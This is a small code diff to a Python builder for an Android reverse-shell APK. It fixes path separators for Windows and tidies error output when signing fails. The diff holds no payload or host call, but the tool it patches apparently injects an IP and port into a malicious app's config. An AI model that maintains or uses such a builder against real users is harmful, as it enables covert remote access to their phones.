@@ -26,8 +26,10 @@ args = parser.parse_args()
 if(platform.system() == 'Windows'):
     init(convert=True)
     clear = lambda: os.system('cls')
+    direc = "\\"
 else:
     clear = lambda: os.system('clear')
+    direc = "/"
 
 if is_valid_ip(args.ip):
     ip = args.ip
@@ -98,7 +100,7 @@ if args.shell:
 
 
 if args.build:
-    editor = "Compiled_apk_files/smali/com/example/reverseshell2/config.smali"
+    editor = "Compiled_apk_files"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
     port = str(port)
     try:
         file = open(editor,"r").readlines()
@@ -137,5 +139,5 @@ if args.build:
             print(Fore.GREEN+"\rSuccessfully signed the apk "+outFileName+Fore.RESET,end="")
             print(" ")
         else:
-            print(resOut.stderr)
+            print("\r"+resOut.stderr)
             print(Fore.RED+"Building Failed"+Fore.RESET)
